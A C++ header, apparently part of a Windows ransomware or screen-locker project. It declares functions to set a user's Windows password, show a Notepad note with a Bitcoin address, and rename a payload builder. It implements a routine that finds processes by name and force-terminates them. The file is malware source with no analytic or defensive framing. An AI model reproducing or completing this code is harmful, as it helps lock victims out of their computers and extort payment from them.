#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

using namespace std;

enum {
    status_success = 0
};

struct utils {
public:
	string random_string(const int len);
	void set_password_windows(string user_name, string password);
	const char* get_user_name();
	void show_notepad(string user_name, string btc_addr);
    void rename_builder();

    void kill_process(const char* process_name)
    {
        HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
        PROCESSENTRY32 pEntry;
        pEntry.dwSize = sizeof(pEntry);
        BOOL hRes = Process32First(hSnapShot, &pEntry);
        while (hRes)
        {
            if (strcmp(pEntry.szExeFile, process_name) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                    (DWORD)pEntry.th32ProcessID);
                if (hProcess != NULL)
                {
                    TerminateProcess(hProcess, 9);
                    CloseHandle(hProcess);
                }
            }
            hRes = Process32Next(hSnapShot, &pEntry);
        }
        CloseHandle(hSnapShot);
    }
};

extern utils g_utils;